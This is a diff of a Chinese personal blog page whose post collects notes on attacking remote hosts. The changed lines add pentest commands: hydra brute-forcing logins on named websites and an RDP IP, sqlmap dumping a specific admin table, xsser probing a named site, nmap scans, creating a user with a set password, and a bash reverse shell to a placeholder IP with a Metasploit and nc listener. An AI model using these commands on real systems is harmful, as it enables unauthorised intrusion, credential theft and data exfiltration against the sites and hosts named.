@@ -98,7 +98,7 @@
 <meta property="og:url" content="http://yoursite.com/2017/07/14/攻击远程主机的步骤/index.html">
 <meta property="og:site_name" content="zgjx的博客">
 <meta property="og:description" content="尝试攻击远程主机的一些笔记">
-<meta property="og:updated_time" content="2018-06-11T05:59:24.103Z">
+<meta property="og:updated_time" content="2018-09-21T01:59:43.121Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="攻击远程主机的步骤">
 <meta name="twitter:description" content="尝试攻击远程主机的一些笔记">
@@ -384,19 +384,26 @@
 <li>win远程破解。需要开启3389端口，使用<code>hydra 180.97.81.126 rdp -P /root/111弱口令.txt -l administrator -V -e ns</code>暴力破解</li>
 <li>暴力破解win密码hash。</li>
 </ol>
-<h3 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h3><p>ping扫描<code>nmap -sP 192.168.***.***</code><br>端口及服务扫描<code>nmap -O -Pn -sS -sV 192.168.***.***</code></p>
+<p><a href="https://blog.werner.wiki/penetration-testing-practice-detect/" target="_blank" rel="external">渗透测试实践-侦查</a><br><a href="http://www.freebuf.com/sectool/137806.html" target="_blank" rel="external">子域名发掘神器：AQUATONE</a><br><a href="http://www.freebuf.com/articles/web/179043.html" target="_blank" rel="external">经验分享｜谈谈渗透测试中的信息搜集 </a></p>
+<h3 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h3><p>ping扫描<code>nmap -sP 192.168.***.***</code><br>端口及服务扫描<code>nmap -O -Pn -sS -sV 192.168.***.***</code><br>全部扫描<code>nmap -T4 -A 192.168.***.***</code><br>快速扫描<code>nmap -T4 -F 192.168.***.***</code><br>指定端口扫描<code>nmap -T4 -p 8080 192.168.***.***</code></p>
 <h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>Nessus<br>    linux:service nessusd start/win:启动服务Tenable nessus<br>    打开本机HTTPS://IP:8834<br>    升级：nessuscli update –all<br>NetXpose<br>Owasp</p>
-<h3 id="工具示例"><a href="#工具示例" class="headerlink" title="工具示例"></a>工具示例</h3><p><a href="http://www.freebuf.com/sectool/105524.html" target="_blank" rel="external">渗透测试工具实战技巧合集</a></p>
+<h3 id="工具-示例"><a href="#工具-示例" class="headerlink" title="工具/示例"></a>工具/示例</h3><p><a href="http://www.freebuf.com/sectool/105524.html" target="_blank" rel="external">渗透测试工具实战技巧合集</a></p>
 <ul>
-<li>hydra<br>暴力破解http登录密码：<code>hydra www.idanbai.com -l admin -P /root/1800pass.txt -f -V http-post-form &quot;/web/index.php?r=admin/public/login-exec:username=^USER^&amp;password=^PASS^:errcode&quot; -t 4 -vV -e ns</code><br>ssh,mysql:<code>hydra -l root -P /root/1800pass.txt -t 8 -e ns 172.26.1.7 ssh -vV</code><br>hydra配置代理:<code>export HYDRA_PROXY_HTTP=http://172.17.18.80:8080</code></li>
-<li>sqlmap<br>是否存在sql注入漏洞并扫描出所有数据库：<code>sqlmap -r t.txt --dbs --proxy http://172.17.18.80:8080</code><br>导出数据库表：<code>sqlmap -r t.txt --proxy http://172.17.18.80:8080 --threads 8 --dbms mysql -D stu_ea_sx -T stu_admin_info --dumps</code></li>
-<li>xsser<br>自动检测反射性xss:<code>xsser -u http://www.jiangkuang.com/product.asp -g ?BigClassName= -s -v --proxy=http://172.17.18.80:8080 --auto</code></li>
-<li>Metagoofil: 一款利用Google收集信息的工具</li>
-<li>dirb: 目录扫描</li>
+<li><code>hydra</code><br>暴力破解http登录密码：<code>hydra www.idanbai.com -l admin -P /root/1800pass.txt -f -V http-post-form &quot;/web/index.php?r=admin/public/login-exec:username=^USER^&amp;password=^PASS^:errcode&quot; -t 4 -vV -e ns</code><br>ssh,mysql:<code>hydra -l root -P /root/1800pass.txt -t 8 -e ns 172.26.1.7 ssh -vV</code><br>hydra配置代理:<code>export HYDRA_PROXY_HTTP=http://172.17.18.80:8080</code></li>
+<li><code>sqlmap</code><br>是否存在sql注入漏洞并扫描出所有数据库：<code>sqlmap -r t.txt --dbs --proxy http://172.17.18.80:8080</code><br>导出数据库表：<code>sqlmap -r t.txt --proxy http://172.17.18.80:8080 --threads 8 --dbms mysql -D stu_ea_sx -T stu_admin_info --dumps</code></li>
+<li><code>xsser</code><br>自动检测反射性xss:<code>xsser -u http://www.jiangkuang.com/product.asp -g ?BigClassName= -s -v --proxy=http://172.17.18.80:8080 --auto</code></li>
+<li><code>Metagoofil</code>: 一款利用Google收集信息的工具</li>
+<li><code>dirb</code>: 目录扫描</li>
 <li><a href="https://tools.kali.org/tools-listing" target="_blank" rel="external">kali系统中的工具清单 - 官方介绍</a></li>
 <li><code>nikto -host http://*.*</code> 扫描指定主机的web类型，主机名。特定目录，cookie，特定cgi漏洞，xss漏洞，sql漏洞，返回主机允许的http方法等安全问题的工具。</li>
+<li><code>zenmap</code>图形化端口扫描工具</li>
+<li><code>Sublister</code>枚举子域名工具</li>
+<li><code>angry ip scanner</code>IP地址扫描工具</li>
+<li><a href="https://hackfun.org/2017/10/03/超赞的恶意软件分析/" target="_blank" rel="external">超赞的恶意软件分析</a></li>
 </ul>
-<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p><a href="https://bbs.pediy.com/thread-224874.htm" target="_blank" rel="external">渗透测试总结-面经</a></p>
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p><a href="https://bbs.pediy.com/thread-224874.htm" target="_blank" rel="external">渗透测试总结-面经</a><br><a href="http://dbaplus.cn/news-11-2078-1.html" target="_blank" rel="external">教你一些MySQL数据库入侵及防御方法</a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># python -m SimpleHTTPServer</span></div><div class="line"><span class="comment"># python3 -m http.server</span></div></pre></td></tr></table></figure></p>
+<p>linux打包:<code>tar -zcvf</code>，解压<code>tar -zxvf</code><br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 新增用户及修改密码</span></div><div class="line">useradd ri</div><div class="line"><span class="built_in">echo</span> <span class="_">-e</span> <span class="string">"New201609\nNew201609"</span> | passwd <span class="string">"ri"</span></div><div class="line"><span class="comment"># 删除用户及其目录</span></div><div class="line">userdel -rf ri</div></pre></td></tr></table></figure></p>
+<p><code>反弹shell</code>:<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 目标机执行</span></div><div class="line">bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1 <span class="comment"># 替换ip和port</span></div><div class="line"><span class="comment"># 本机msf执行</span></div><div class="line">use exploit/multi/handler</div><div class="line"><span class="built_in">set</span> payload linux/armle/shell/reverse_tcp</div><div class="line"><span class="built_in">set</span> lport 6666</div><div class="line"><span class="built_in">set</span> lhost xxx.xxx.xxx.xxx</div><div class="line"><span class="built_in">set</span> exitonsession <span class="literal">false</span></div><div class="line">exploit -j</div><div class="line"><span class="comment"># 或本机nc执行</span></div><div class="line">nc <span class="_">-l</span> -p &lt;port&gt;</div></pre></td></tr></table></figure></p>
 
       
     </div>
@@ -449,8 +456,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/08/25/ruby gem通过修改文件配置代理/" rel="prev" title="ruby中rails的gem和bundle配置系统代理">
-                ruby中rails的gem和bundle配置系统代理 <i class="fa fa-chevron-right"></i>
+              <a href="/2017/08/25/railsinstaller安装后执行rails提示系统找不到指定的路径的解决办法/" rel="prev" title="railsinstaller安装后执行rails提示系统找不到指定的路径的解决办法">
+                railsinstaller安装后执行rails提示系统找不到指定的路径的解决办法 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -523,7 +530,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">29</span>
+                <span class="site-state-item-count">30</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -600,7 +607,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#信息收集"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#端口"><span class="nav-number">2.</span> <span class="nav-text">端口</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞"><span class="nav-number">3.</span> <span class="nav-text">漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#工具示例"><span class="nav-number">4.</span> <span class="nav-text">工具示例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他"><span class="nav-number">5.</span> <span class="nav-text">其他</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#信息收集"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#端口"><span class="nav-number">2.</span> <span class="nav-text">端口</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞"><span class="nav-number">3.</span> <span class="nav-text">漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#工具-示例"><span class="nav-number">4.</span> <span class="nav-text">工具/示例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他"><span class="nav-number">5.</span> <span class="nav-text">其他</span></a></li></ol></div>
             
 
           </div>
